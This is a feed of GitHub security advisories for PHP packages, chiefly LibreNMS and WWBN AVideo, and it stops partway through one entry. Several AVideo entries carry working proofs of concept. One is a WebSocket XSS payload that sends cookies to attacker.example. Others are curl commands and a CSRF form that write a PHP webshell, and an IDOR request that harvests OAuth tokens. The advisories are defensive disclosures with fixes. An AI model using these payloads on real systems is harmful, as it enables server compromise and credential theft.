<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2026-04-14T23:12:03.304Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] Duplicate Advisory: LibreNMS is Vulnerable to Remote Code Execution by Arbitrary File Write]]></title>
        <id>https://github.com/advisories/GHSA-7549-ggpq-22w8</id>
        <link href="https://github.com/advisories/GHSA-7549-ggpq-22w8"/>
        <updated>2026-04-14T22:51:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-pr3g-phhr-h8fh. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>LibreNMS versions before 26.3.0 are affected by an authenticated remote code execution vulnerability by abusing the&nbsp;Binary Locations&nbsp;config&nbsp;and the Netcommand feature. Successful exploitation requires administrative privileges. Exploitation could result in compromise of the underlying web server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-pr3g-phhr-h8fh">https://github.com/librenms/librenms/security/advisories/GHSA-pr3g-phhr-h8fh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6204">https://nvd.nist.gov/vuln/detail/CVE-2026-6204</a></li>
<li><a href="https://projectblack.io/blog/librenms-authenticated-rce-and-xss/#binary-path-rce-poc">https://projectblack.io/blog/librenms-authenticated-rce-and-xss/#binary-path-rce-poc</a></li>
<li><a href="https://github.com/advisories/GHSA-7549-ggpq-22w8">https://github.com/advisories/GHSA-7549-ggpq-22w8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7549-ggpq-22w8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-13T12:31:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] LibreNMS affected by an authenticated Cross-site Scripting vulnerability on the showconfig page]]></title>
        <id>https://github.com/advisories/GHSA-rp7w-624x-95qv</id>
        <link href="https://github.com/advisories/GHSA-rp7w-624x-95qv"/>
        <updated>2026-04-14T22:50:27.000Z</updated>
        <content type="html"><![CDATA[<p>LibreNMS versions before 26.3.0 are affected by an authenticated Cross-site Scripting vulnerability on the showconfig page. Successful exploitation requires administrative privileges. Exploitation could result in XSS attacks being performed against other users with access to the page.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2728">https://nvd.nist.gov/vuln/detail/CVE-2026-2728</a></li>
<li><a href="https://projectblack.io/blog/librenms-authenticated-rce-and-xss/#xss-on-showconfig-page-2630">https://projectblack.io/blog/librenms-authenticated-rce-and-xss/#xss-on-showconfig-page-2630</a></li>
<li><a href="https://github.com/advisories/GHSA-rp7w-624x-95qv">https://github.com/advisories/GHSA-rp7w-624x-95qv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rp7w-624x-95qv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-13T12:31:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wwbn/avideo] WWBN AVideo YPTSocket WebSocket Broadcast Relay Leads to Unauthenticated Cross-User JavaScript Execution via Client-Side eval() Sinks]]></title>
        <id>https://github.com/advisories/GHSA-gph2-j4c9-vhhr</id>
        <link href="https://github.com/advisories/GHSA-gph2-j4c9-vhhr"/>
        <updated>2026-04-14T22:50:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The YPTSocket plugin's WebSocket server relays attacker-supplied JSON message bodies to every connected client without sanitizing the <code>msg</code> or <code>callback</code> fields. On the client side, <code>plugin/YPTSocket/script.js</code> contains two <code>eval()</code> sinks fed directly by those relayed fields (<code>json.msg.autoEvalCodeOnHTML</code> at line 568 and <code>json.callback</code> at line 95). Because tokens are minted for anonymous visitors and never revalidated beyond decryption, an unauthenticated attacker can broadcast arbitrary JavaScript that executes in the origin of every currently-connected user (including administrators), resulting in universal account takeover, session theft, and privileged action execution.</p>
<h2 id="details">Details</h2>
<h3 id="token-issuance-is-unauthenticated">Token issuance is unauthenticated</h3>
<p><code>plugin/YPTSocket/getWebSocket.json.php:11-21</code> returns a token to anyone whose request reaches the endpoint — the only check is that the plugin is enabled:</p>
<pre><code class="language-php">if(!AVideoPlugin::isEnabledByName("YPTSocket")){
    $obj-&gt;msg = "Socket plugin not enabled";
    die(json_encode($obj));
}
$obj-&gt;error = false;
$obj-&gt;webSocketToken = getEncryptedInfo(0);
$obj-&gt;webSocketURL = YPTSocket::getWebSocketURL();
</code></pre>
<p><code>getEncryptedInfo()</code> in <code>plugin/YPTSocket/functions.php:3-16</code> populates <code>from_users_id = User::getId()</code> (0 for guests) and <code>isAdmin = User::isAdmin()</code> (false for guests). The issued token is accepted by the WebSocket server's <code>onOpen</code> handler (<code>Message.php:44-52</code>) solely by successful decryption — there is no requirement for the connecting principal to be authenticated.</p>
<h3 id="server-relays-attacker-json-verbatim">Server relays attacker JSON verbatim</h3>
<p><code>plugin/YPTSocket/Message.php:191-245</code> — the default branch of <code>onMessage</code> only rewrites <code>from_identification</code>:</p>
<pre><code class="language-php">public function onMessage(ConnectionInterface $from, $msg) {
    ...
    $json = _json_decode($msg);
    if (empty($json-&gt;webSocketToken)) { return false; }
    if (!$msgObj = getDecryptedInfo($json-&gt;webSocketToken)) { return false; }

    switch ($json-&gt;msg) {
        ...
        default:
            $this-&gt;msgToArray($json);
            if (isset($json['from_identification'])) {
                $json['from_identification'] = strip_tags((string)($msgObj-&gt;user_name ?? ''));
            }
            ...
            } else {
                $this-&gt;msgToAll($from, $json);  // broadcast
            }
            break;
    }
}
</code></pre>
<p><code>msgToResourceId()</code> at <code>Message.php:297-310</code> copies the attacker-controlled <code>callback</code> and <code>msg</code> fields into the outbound payload:</p>
<pre><code class="language-php">if (isset($msg['callback'])) {
    $obj['callback'] = $msg['callback'];  // tainted
    ...
}
...
} else if (!empty($msg['msg'])) {
    $obj['msg'] = $msg['msg'];  // tainted — entire object forwarded verbatim
}
</code></pre>
<p><code>$obj</code> is JSON-encoded at line 335 and sent to every connected client.</p>
<h3 id="client-side-sink-1-autoevalcodeonhtml-→-eval">Client-side sink #1: <code>autoEvalCodeOnHTML</code> → eval</h3>
<p><code>plugin/YPTSocket/script.js:163-169</code> (raw WebSocket transport) sets every inbound frame as <code>yptSocketResponse</code> and unconditionally calls <code>parseSocketResponse()</code>:</p>
<pre><code class="language-js">connWS.onmessage = function (e) {
    var json = JSON.parse(e.data);
    ...
    yptSocketResponse = json;
    parseSocketResponse();
    ...
};
</code></pre>
<p><code>parseSocketResponse()</code> at <code>script.js:545-569</code> reaches the sink:</p>
<pre><code class="language-js">async function parseSocketResponse() {
    const json = yptSocketResponse;
    ...
    if (json.msg?.autoEvalCodeOnHTML !== undefined) {
        eval(json.msg.autoEvalCodeOnHTML);   // &lt;-- attacker-controlled
    }
    ...
}
</code></pre>
<h3 id="client-side-sink-2-jsoncallback-→-eval">Client-side sink #2: <code>json.callback</code> → eval</h3>
<p><code>plugin/YPTSocket/script.js:91-95</code> — <code>processSocketJson()</code> concatenates attacker-controlled <code>json.callback</code> into an eval'd string. This path is reachable on BOTH transports: the raw WebSocket branch (<code>script.js:182</code>) and the Socket.IO branch (<code>script.js:339</code> via <code>socket.on("message", (data) =&gt; { … processSocketJson(data) })</code>):</p>
<pre><code class="language-js">if (json.callback) {
    var code = "if (typeof " + json.callback + " == 'function') { myfunc = " + json.callback + "; } else { myfunc = defaultCallback; }";
    socketLog('Executing callback:', json.callback);
    eval(code);
    ...
}
</code></pre>
<p>Because <code>json.callback</code> is interpolated as raw source, a payload like <code>alert(document.cookie);window.x</code> breaks out of the <code>typeof</code> expression and executes during the condition evaluation.</p>
<h2 id="poc">PoC</h2>
<p>Prerequisite: target is running AVideo with the YPTSocket plugin enabled (default on most installs).</p>
<p><strong>Step 1 — obtain a token anonymously</strong> (no cookies, no auth):</p>
<pre><code class="language-bash">curl -s 'https://target.example/plugin/YPTSocket/getWebSocket.json.php'
</code></pre>
<p>Expected output (abbreviated):</p>
<pre><code class="language-json">{"error":false,"msg":"","webSocketToken":"&lt;long encrypted token&gt;","webSocketURL":"wss://target.example:8888/?webSocketToken=&lt;token&gt;&amp;..."}
</code></pre>
<p><strong>Step 2 — connect to the WebSocket endpoint</strong> using the returned <code>webSocketURL</code>. A minimal Node.js client:</p>
<pre><code class="language-js">const WebSocket = require('ws');
const TOKEN = '&lt;token from step 1&gt;';
const URL   = '&lt;webSocketURL from step 1&gt;';
const ws = new WebSocket(URL, { rejectUnauthorized: false });

ws.on('open', () =&gt; {
    // Payload 1 — primary sink (raw WebSocket transport):
    ws.send(JSON.stringify({
        webSocketToken: TOKEN,
        msg: {
            autoEvalCodeOnHTML:
                "fetch('https://attacker.example/x?c='+encodeURIComponent(document.cookie));" +
                "alert('XSS as '+document.domain);"
        }
    }));

    // Payload 2 — secondary sink (reaches both raw WS and Socket.IO clients):
    ws.send(JSON.stringify({
        webSocketToken: TOKEN,
        msg: "p",
        callback: "alert(document.domain);window.x"
    }));
});
</code></pre>
<p><strong>Step 3 — observe impact.</strong> Every other user currently connected to the same AVideo instance (via any page that loads YPTSocket's <code>script.js</code> — the global footer, the admin dashboard, live streams, video pages) receives the broadcast. In their browser:</p>
<ul>
<li>Payload 1 reaches <code>parseSocketResponse()</code> at line 568 and evaluates <code>eval(json.msg.autoEvalCodeOnHTML)</code>, firing the exfiltration request to <code>attacker.example</code> with <code>document.cookie</code>.</li>
<li>Payload 2 reaches <code>processSocketJson()</code> at line 95; the synthesized <code>code</code> string is <code>if (typeof alert(document.domain);window.x == 'function') { ... }</code>, which executes <code>alert(document.domain)</code> during the <code>typeof</code> evaluation.</li>
</ul>
<p>Any administrator who is online at the moment of the broadcast has their session cookie exfiltrated and/or arbitrary actions performed in their browser context.</p>
<h2 id="impact">Impact</h2>
<p>A single unauthenticated request and one WebSocket frame grants the attacker <strong>universal client-side code execution</strong> across every user currently connected to the target AVideo instance. Concretely:</p>
<ul>
<li>Session theft of every connected user, including administrators (note: <code>HttpOnly</code> does not help because the attacker's JS runs in-origin and can call privileged endpoints directly without ever reading cookies).</li>
<li>Privileged action execution on behalf of any admin who happens to be online — including plugin installation (<code>GHSA-v8jw-8w5p-23g3</code> shows admin plugin ZIP upload is already an RCE primitive), user promotion/demotion, video deletion, configuration changes.</li>
<li>Stored cross-user JS persistence via <code>localStorage</code>, IndexedDB, or re-submitting the payload as a comment/title through admin credentials.</li>
<li>Financial redirection (payment flows, crypto-donation addresses) and phishing via arbitrary DOM rewriting of the authentic AVideo origin.</li>
<li>The scope change (S:C) is genuine: an unauthenticated (or low-privileged) attacker's actions cross the trust boundary into every other user's browser authorization context, including admin.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Multiple defense-in-depth layers are required:</p>
<p><strong>1. Remove the client-side eval sinks entirely.</strong> <code>plugin/YPTSocket/script.js</code>:</p>
<pre><code class="language-diff">- if (json.msg?.autoEvalCodeOnHTML !== undefined) {
-     eval(json.msg.autoEvalCodeOnHTML);
- }
</code></pre>
<p>No legitimate server flow should push arbitrary JavaScript through a broadcast channel — if server-driven UI updates are needed, use structured data and predefined handler functions.</p>
<p>Replace the callback dispatch at lines 91-95 with a strict name-based lookup against a predefined allowlist:</p>
<pre><code class="language-diff">- if (json.callback) {
-     var code = "if (typeof " + json.callback + " == 'function') { myfunc = " + json.callback + "; } else { myfunc = defaultCallback; }";
-     eval(code);
-     ...
- } else {
-     myfunc = defaultCallback;
- }
+ var ALLOWED_CALLBACKS = ['socketNewConnection', 'socketDisconnection', /* ... */];
+ if (typeof json.callback === 'string' &amp;&amp; ALLOWED_CALLBACKS.indexOf(json.callback) !== -1
+     &amp;&amp; typeof window[json.callback] === 'function') {
+     myfunc = window[json.callback];
+     const event = new CustomEvent(json.callback, { detail: _details });
+     document.dispatchEvent(event);
+ } else {
+     myfunc = defaultCallback;
+ }
</code></pre>
<p><strong>2. Server-side: allowlist keys on relayed <code>msg</code> objects.</strong> In <code>plugin/YPTSocket/Message.php::onMessage()</code> default branch, whitelist the fields permitted in relayed broadcasts rather than forwarding <code>$msg['msg']</code> verbatim:</p>
<pre><code class="language-php">// At top of default branch, after msgToArray:
$ALLOWED_MSG_KEYS = ['type', 'text', 'videos_id', 'users_id', /* ... */];
if (isset($json['msg']) &amp;&amp; is_array($json['msg'])) {
    $json['msg'] = array_intersect_key($json['msg'], array_flip($ALLOWED_MSG_KEYS));
}
// Similarly sanitize callback:
if (isset($json['callback']) &amp;&amp; !preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/', (string)$json['callback'])) {
    unset($json['callback']);
}
</code></pre>
<p><strong>3. Restrict token issuance and sender privileges.</strong> <code>plugin/YPTSocket/getWebSocket.json.php</code> should require authentication (or at least reject anonymous broadcast capability). Unprivileged senders should not be permitted to trigger <code>msgToAll</code> at all — the default branch of <code>onMessage</code> should require <code>$msgObj-&gt;isAdmin</code> (or equivalent) before allowing broadcasts, since there is no legitimate reason for arbitrary clients to originate system-wide messages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-gph2-j4c9-vhhr">https://github.com/WWBN/AVideo/security/advisories/GHSA-gph2-j4c9-vhhr</a></li>
<li><a href="https://github.com/WWBN/AVideo/commit/c08694bf6264eb4decceb78c711baee2609b4efd">https://github.com/WWBN/AVideo/commit/c08694bf6264eb4decceb78c711baee2609b4efd</a></li>
<li><a href="https://github.com/advisories/GHSA-gph2-j4c9-vhhr">https://github.com/advisories/GHSA-gph2-j4c9-vhhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gph2-j4c9-vhhr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-14T22:50:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wwbn/avideo] WWBN AVideo has a Path Traversal in Locale Save Endpoint Enables Arbitrary PHP File Write to Any Web-Accessible Directory (RCE)]]></title>
        <id>https://github.com/advisories/GHSA-6rc6-p838-686f</id>
        <link href="https://github.com/advisories/GHSA-6rc6-p838-686f"/>
        <updated>2026-04-14T22:49:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The locale save endpoint (<code>locale/save.php</code>) constructs a file path by directly concatenating <code>$_POST['flag']</code> into the path at line 30 without any sanitization. The <code>$_POST['code']</code> parameter is then written verbatim to that path via <code>fwrite()</code> at line 40. An admin attacker (or any user who can CSRF an admin, since no CSRF token is checked and cookies use <code>SameSite=None</code>) can traverse out of the <code>locale/</code> directory and write arbitrary <code>.php</code> files to any writable location on the filesystem, achieving Remote Code Execution.</p>
<h2 id="details">Details</h2>
<p>In <code>locale/save.php</code>, the vulnerable code path is:</p>
<pre><code class="language-php">// locale/save.php:10 — only auth check, no CSRF token
if (!User::isAdmin() || !empty($global['disableAdvancedConfigurations'])) {
    // ...
    die(json_encode($obj));
}

// locale/save.php:16 — base directory
$dir = "{$global['systemRootPath']}locale/";

// locale/save.php:30 — UNSANITIZED path concatenation
$file = $dir.($_POST['flag']).".php";
$myfile = fopen($file, "w") or die("Unable to open file!");

// locale/save.php:40 — UNSANITIZED content write
fwrite($myfile, $_POST['code']);
</code></pre>
<p><strong>Root cause</strong>: <code>$_POST['flag']</code> is concatenated directly into the file path with no call to <code>basename()</code>, <code>realpath()</code>, or any filtering of <code>../</code> sequences. A <code>flag</code> value like <code>../../shell</code> resolves to <code>{systemRootPath}locale/../../shell.php</code>, which escapes the locale directory and writes to <code>{systemRootPath}../shell.php</code> — the web-accessible parent directory.</p>
<p>The file content is constructed as:</p>
<pre><code class="language-php">&lt;?php
global $t;
{$_POST['code']}  // attacker-controlled, written verbatim
</code></pre>
<p>An attacker can inject arbitrary PHP after closing the translation context (e.g., <code>$t["x"]=1;?&gt;&lt;?php system($_GET["c"]);</code>).</p>
<p><strong>CSRF amplification</strong>: The endpoint performs no CSRF token validation. AVideo intentionally sets <code>SameSite=None</code> on session cookies (for cross-origin iframe support), which means cross-site POST requests from an attacker's page will include the admin's session cookie, making CSRF exploitation trivial.</p>
<h2 id="poc">PoC</h2>
<p><strong>Direct exploitation (requires admin session):</strong></p>
<pre><code class="language-bash"># Step 1: Write a webshell outside locale/ to the webroot
curl -b 'PHPSESSID=&lt;admin_session&gt;' \
  -X POST 'https://target/locale/save.php' \
  -d 'flag=../../webshell&amp;code=$t["x"]=1;?&gt;&lt;%3fphp+system($_GET["c"]);'

# Step 2: Execute commands via the written webshell
curl 'https://target/webshell.php?c=id'
# Response: uid=33(www-data) gid=33(www-data) ...
</code></pre>
<p><strong>CSRF variant (no direct admin access needed):</strong></p>
<p>Host the following HTML on an attacker-controlled site and lure an admin to visit:</p>
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;
&lt;form method="POST" action="https://target/locale/save.php"&gt;
  &lt;input type="hidden" name="flag" value="../../webshell"&gt;
  &lt;input type="hidden" name="code" value='$t["x"]=1;?&gt;&lt;?php system($_GET["c"]);'&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After the admin visits the page, the attacker accesses <code>https://target/webshell.php?c=id</code> for RCE.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Remote Code Execution</strong>: An attacker can write arbitrary PHP code to any writable web-accessible directory, achieving full server compromise.</li>
<li><strong>CSRF to RCE chain</strong>: Because no CSRF token is required and <code>SameSite=None</code> is set, any user who can trick an admin into visiting a malicious page achieves unauthenticated RCE. This significantly expands the attack surface beyond admin-only.</li>
<li><strong>Full server compromise</strong>: With arbitrary PHP execution as the web server user, the attacker can read/modify the database, access all user data, pivot to other services, and potentially escalate privileges on the host.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Sanitize the <code>flag</code> parameter to prevent path traversal and add CSRF protection:</p>
<pre><code class="language-php">// locale/save.php — after the admin check at line 14

// Add CSRF token validation
if (empty($_POST['token']) || !User::isValidToken($_POST['token'])) {
    $obj-&gt;status = 0;
    $obj-&gt;error = __("Invalid token");
    die(json_encode($obj));
}

// Sanitize flag to prevent path traversal
$flag = basename($_POST['flag']); // strip directory components
if (empty($flag) || preg_match('/[^a-zA-Z0-9_\-]/', $flag)) {
    $obj-&gt;status = 0;
    $obj-&gt;error = __("Invalid locale flag");
    die(json_encode($obj));
}

$file = $dir . $flag . ".php";

// Verify resolved path is within expected directory
$realDir = realpath($dir);
$realFile = realpath(dirname($file)) . '/' . basename($file);
if (strpos($realFile, $realDir) !== 0) {
    $obj-&gt;status = 0;
    $obj-&gt;error = __("Invalid file path");
    die(json_encode($obj));
}
</code></pre>
<p>Additionally, the <code>code</code> parameter should be validated to ensure it only contains translation assignments (<code>$t[...] = ...;</code>) and does not include PHP opening/closing tags or arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-6rc6-p838-686f">https://github.com/WWBN/AVideo/security/advisories/GHSA-6rc6-p838-686f</a></li>
<li><a href="https://github.com/advisories/GHSA-6rc6-p838-686f">https://github.com/advisories/GHSA-6rc6-p838-686f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6rc6-p838-686f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T22:49:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wwbn/avideo] WWBN AVideo has an Unauthenticated Information Disclosure via git.json.php Exposes Developer Emails and Deployed Version]]></title>
        <id>https://github.com/advisories/GHSA-52hf-63q4-r926</id>
        <link href="https://github.com/advisories/GHSA-52hf-63q4-r926"/>
        <updated>2026-04-14T22:49:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The file <code>git.json.php</code> at the web root executes <code>git log -1</code> and returns the full output as JSON to any unauthenticated user. This exposes the exact deployed commit hash (enabling version fingerprinting against known CVEs), developer names and email addresses (PII), and commit messages which may contain references to internal systems or security fixes.</p>
<h2 id="details">Details</h2>
<p><code>git.json.php</code> is a standalone PHP script with no authentication, no session validation, and no framework bootstrap. It directly executes a shell command and returns the result:</p>
<pre><code class="language-php">// git.json.php — complete file
&lt;?php
header('Content-Type: application/json');
$cmd = "git log -1";
exec($cmd . "  2&gt;&amp;1", $output, $return_val);

$obj = new stdClass();
$obj-&gt;output = $output;

foreach ($output as $value) {
    preg_match("/Date:(.*)/i", $value, $match);
    if (!empty($match[1])) {
        $obj-&gt;date = strtotime($match[1]);
        $obj-&gt;dateString = trim($match[1]);
        $obj-&gt;dateMySQL = date("Y-m-d H:i:s", $obj-&gt;date);
    }
}

echo json_encode($obj);
</code></pre>
<p>The file does not <code>require</code> any configuration or authentication module. It is not protected by <code>.htaccess</code> rules. The endpoint is directly accessible to any network client.</p>
<p>The exposed data enables:</p>
<ol>
<li><strong>Version fingerprinting</strong>: The commit hash identifies the exact deployed version, allowing attackers to cross-reference the project's public git history against known CVEs (AVideo has 22 published GHSAs) to determine which vulnerabilities remain unpatched on a given instance.</li>
<li><strong>Developer PII leakage</strong>: Author name and email from the git commit are exposed. On self-hosted instances, this may reveal internal/corporate email addresses not otherwise publicly available.</li>
<li><strong>Commit message intelligence</strong>: Commit messages may reference internal bug trackers, security fixes in progress, or infrastructure details.</li>
</ol>
<h2 id="poc">PoC</h2>
<pre><code class="language-bash"># Single unauthenticated request — no cookies, no headers needed
curl -s https://target.example/git.json.php | python3 -m json.tool
</code></pre>
<p>Verified response from test instance:</p>
<pre><code class="language-json">{
    "output": [
        "commit 80a8af96e861cff45cd80fdd2478d00b2c07749e",
        "Author: Daniel Neto &lt;me@danielneto.com&gt;",
        "Date:   Wed Apr 8 16:07:23 2026 -0300",
        "",
        "    fix: Update payment response handling to include transaction token and URL"
    ],
    "date": 1775675243,
    "dateString": "Wed Apr 8 16:07:23 2026 -0300",
    "dateMySQL": "2026-04-08 19:07:23"
}
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li>Any unauthenticated remote attacker can determine the exact deployed version and identify which known CVEs (22 published GHSAs for AVideo) apply to the target instance.</li>
<li>Developer email addresses are leaked, enabling targeted phishing or social engineering against project maintainers and contributors.</li>
<li>Commit messages may disclose internal project details, security fix status, or infrastructure information.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Delete <code>git.json.php</code> entirely — it serves no user-facing purpose and exists only as a development/debug artifact:</p>
<pre><code class="language-bash">rm git.json.php
</code></pre>
<p>If version display is needed for administrators, gate it behind authentication:</p>
<pre><code class="language-php">&lt;?php
require_once 'videos/configuration.php';
if (!User::isAdmin()) {
    header('HTTP/1.1 403 Forbidden');
    die(json_encode(['error' =&gt; 'Forbidden']));
}
header('Content-Type: application/json');
$cmd = "git log -1";
exec($cmd . "  2&gt;&amp;1", $output, $return_val);

$obj = new stdClass();
$obj-&gt;output = $output;

foreach ($output as $value) {
    preg_match("/Date:(.*)/i", $value, $match);
    if (!empty($match[1])) {
        $obj-&gt;date = strtotime($match[1]);
        $obj-&gt;dateString = trim($match[1]);
        $obj-&gt;dateMySQL = date("Y-m-d H:i:s", $obj-&gt;date);
    }
}

echo json_encode($obj);
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-52hf-63q4-r926">https://github.com/WWBN/AVideo/security/advisories/GHSA-52hf-63q4-r926</a></li>
<li><a href="https://github.com/advisories/GHSA-52hf-63q4-r926">https://github.com/advisories/GHSA-52hf-63q4-r926</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-52hf-63q4-r926</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T22:49:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wwbn/avideo] WWBN AVideo has an IDOR in Live Restreams list.json.php Exposes Other Users' Stream Keys and OAuth Tokens]]></title>
        <id>https://github.com/advisories/GHSA-gpgp-w4x2-h3h7</id>
        <link href="https://github.com/advisories/GHSA-gpgp-w4x2-h3h7"/>
        <updated>2026-04-14T22:49:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The endpoint <code>plugin/Live/view/Live_restreams/list.json.php</code> contains an Insecure Direct Object Reference (IDOR) vulnerability that allows any authenticated user with streaming permission to retrieve other users' live restream configurations, including third-party platform stream keys and OAuth tokens (access_token, refresh_token) for services like YouTube Live, Facebook Live, and Twitch.</p>
<h2 id="details">Details</h2>
<p>The authorization logic in <code>list.json.php</code> is intended to restrict non-admin users to viewing only their own restream records. However, the implementation at lines 10-14 only enforces this when the <code>users_id</code> GET parameter is absent:</p>
<pre><code class="language-php">// plugin/Live/view/Live_restreams/list.json.php:6-19
if (!User::canStream()) {
    die('{"data": []}');
}

if (empty($_GET['users_id'])) {       // Line 10: only triggers when param is MISSING
    if (!User::isAdmin()) {
        $_GET['users_id'] = User::getId();  // Line 12: force to own ID
    }
}

if (empty($_GET['users_id'])) {
    $rows = Live_restreams::getAll();
} else {
    $rows = Live_restreams::getAllFromUser($_GET['users_id'], "");  // Line 19: attacker-controlled ID
}
</code></pre>
<p>When a non-admin user explicitly supplies <code>?users_id=&lt;victim_id&gt;</code>, the value is non-empty, so the override at line 12 is never reached. The attacker-controlled ID passes directly to <code>getAllFromUser()</code>, which executes:</p>
<pre><code class="language-php">// plugin/Live/Objects/Live_restreams.php:90
$sql = "SELECT * FROM live_restreams WHERE users_id = $users_id";
</code></pre>
<p>This returns all columns from the <code>live_restreams</code> table, including:</p>
<ul>
<li><code>stream_key</code> (VARCHAR 500) — the victim's RTMP stream key for third-party platforms</li>
<li><code>stream_url</code> (VARCHAR 500) — the RTMP ingest endpoint</li>
<li><code>parameters</code> (TEXT) — JSON blob containing OAuth credentials (<code>access_token</code>, <code>refresh_token</code>, <code>expires_at</code>) obtained via the restream.ypt.me OAuth flow</li>
</ul>
<p>Other endpoints in the same directory correctly validate ownership. For example, <code>delete.json.php:19</code>:</p>
<pre><code class="language-php">if (!User::isAdmin() &amp;&amp; $row-&gt;getUsers_id() != User::getId()) {
    $obj-&gt;msg = "You are not admin";
    die(json_encode($obj));
}
</code></pre>
<p>This ownership check is missing from <code>list.json.php</code>.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> Two user accounts — attacker (user ID 2, streaming permission) and victim (user ID 1, has configured restreams with third-party platform keys).</p>
<p><strong>Step 1:</strong> Attacker authenticates and retrieves their session cookie.</p>
<p><strong>Step 2:</strong> Attacker requests victim's restream list:</p>
<pre><code class="language-bash">curl -s -b 'PHPSESSID=&lt;attacker_session&gt;' \
  'https://target.com/plugin/Live/view/Live_restreams/list.json.php?users_id=1'
</code></pre>
<p><strong>Expected response (normal behavior):</strong> Empty data or error.</p>
<p><strong>Actual response:</strong> Full restream records for user ID 1:</p>
<pre><code class="language-json">{
  "data": [
    {
      "id": 1,
      "name": "YouTube Live",
      "stream_url": "rtmp://a.rtmp.youtube.com/live2",
      "stream_key": "xxxx-xxxx-xxxx-xxxx-xxxx",
      "parameters": "{\"access_token\":\"ya29.a0A...\",\"refresh_token\":\"1//0e...\",\"expires_at\":1712600000}",
      "users_id": 1,
      "status": "a"
    }
  ]
}
</code></pre>
<p><strong>Step 3:</strong> Attacker can enumerate all user IDs (1, 2, 3, ...) to harvest all configured restream credentials across the platform.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Credential theft:</strong> Attacker obtains third-party platform stream keys and OAuth tokens (access_token, refresh_token) for all users who have configured live restreaming.</li>
<li><strong>Unauthorized broadcasting:</strong> Stolen RTMP stream keys allow the attacker to broadcast arbitrary content to the victim's YouTube, Facebook, or Twitch channels.</li>
<li><strong>OAuth token abuse:</strong> Stolen refresh tokens can be used to obtain new access tokens, providing persistent access to the victim's third-party accounts within the scope of the original OAuth grant.</li>
<li><strong>Full enumeration:</strong> User IDs are sequential integers, enabling trivial enumeration of all platform users' restream credentials.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Add an ownership check in <code>list.json.php</code> consistent with the pattern used in <code>delete.json.php</code> and <code>add.json.php</code>:</p>
<pre><code class="language-php">// plugin/Live/view/Live_restreams/list.json.php — replace lines 10-14
if (!User::isAdmin()) {
    $_GET['users_id'] = User::getId();
}
</code></pre>
<p>This unconditionally forces non-admin users to their own user ID, regardless of whether the <code>users_id</code> parameter was supplied. The <code>empty()</code> check should be removed so that the parameter cannot be used to bypass the restriction.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-gpgp-w4x2-h3h7">https://github.com/WWBN/AVideo/security/advisories/GHSA-gpgp-w4x2-h3h7</a></li>
